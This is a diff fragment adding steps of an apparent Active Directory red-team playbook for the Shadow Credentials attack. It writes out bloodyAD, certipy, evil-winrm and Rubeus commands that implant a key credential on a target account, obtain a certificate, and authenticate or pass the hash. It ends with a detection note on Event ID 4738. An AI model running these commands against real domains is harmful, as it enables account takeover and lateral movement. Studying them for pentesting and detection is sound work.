@@ -1,0 +1,15 @@
+3. **Manual Shadow Attack (If Auto Fails)**
+   - Generate key: `openssl genrsa -out key.pem 2048`
+   - Create KeyCredential blob (requires Python/ASN.1)
+   - Write via LDAP: `bloodyAD -d <domain> -u <user> -p <pass> add keycredential <target> <blob>`
+   - Request cert: `certipy req -u <user> -p <pass> -ca <CA> -template User -pfx <key.pfx>`
+
+4. **Authenticate with Obtained Credentials**
+   - PKINIT (certificate): `certipy auth -pfx <target>.pfx -dc-ip <DC_IP>`
+   - Pass-the-Hash: `evil-winrm -i <DC> -u <target> -H <NTLM_hash_from_certipy>`
+   - Rubeus: `Rubeus.exe asktgt /user:<target> /certificate:<base64_pfx> /ptt`
+
+5. **Cleanup (Optional)**
+   - Remove implanted key: `certipy shadow auto -u <user> -p <pass> -account <target> --remove`
+
+**Detection**: Monitor Event ID 4738 (user account modified) with changes to `msDS-KeyCredentialLink`. Enable LDAP auditing.
